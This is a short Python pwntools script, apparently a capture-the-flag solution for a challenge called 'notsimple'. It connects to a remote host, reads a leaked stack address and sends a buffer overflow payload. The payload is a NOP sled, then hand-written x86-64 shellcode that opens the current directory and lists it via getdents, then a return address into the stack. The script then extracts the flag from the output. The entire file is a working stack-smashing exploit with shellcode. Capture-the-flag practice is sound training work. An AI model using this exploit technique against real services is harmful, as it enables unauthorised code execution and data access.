from pwn import *
import re
p = remote('193.57.159.27', 43851)

context.binary = 'notsimple'

shellcode = asm('''
mov rax, 0x2e
push rax

mov rax, 2
mov rdi, rsp
mov rsi, 0
mov rdx, 0
syscall

mov rdi, rax
mov rdx, 0x1000
sub rsp, rdx
mov rsi, rsp
mov rax, 78
syscall

xchg rax, rdx
mov rax, 1 
mov rdi, 1
mov rsi, rsp
syscall
''')


addr = hex(int(p.recvline().decode("utf-8").strip().split(" ")[-1], 16))
log.info(addr)

p.recvline()

len = len(shellcode)
log.info("Payload size: " + str(len))

buffer = (b'\x90'*(88 - len)) + shellcode + p64(int(addr, 16))

p.sendline(buffer)

p.recvline()

stuff = p.recvline()
flag = stuff[stuff.find(b'rarctf'):stuff.find(b'rarctf')+67].decode('utf-8')
log.info(flag)

p.close()